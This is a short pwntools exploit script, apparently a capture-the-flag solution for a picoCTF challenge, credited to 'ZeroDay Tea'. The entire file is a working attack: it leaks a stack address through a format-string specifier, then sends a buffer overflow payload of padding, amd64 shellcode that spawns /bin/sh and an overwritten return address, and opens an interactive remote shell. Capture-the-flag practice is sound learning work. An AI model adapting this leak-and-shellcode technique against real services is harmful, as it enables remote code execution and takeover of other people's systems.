# Credit to ZeroDay Tea
from pwn import *
import sys
context.arch = 'amd64'

context.log_level = "critical"
r = remote('mercury.picoctf.net', 59636)
i = 23
r.sendline('%{}$p'.format(i))
leak = r.recvline(keepends=False).decode()
address = int(leak, 16)
print(hex(address))
shellcode = asm(shellcraft.amd64.linux.sh())
no_op_count = 40
offset = b'A'*(120-len(shellcode)-no_op_count)
payload = p64(0x90)*no_op_count + shellcode + offset + p64(address)
print(payload)
r.sendline(payload)
r.interactive()
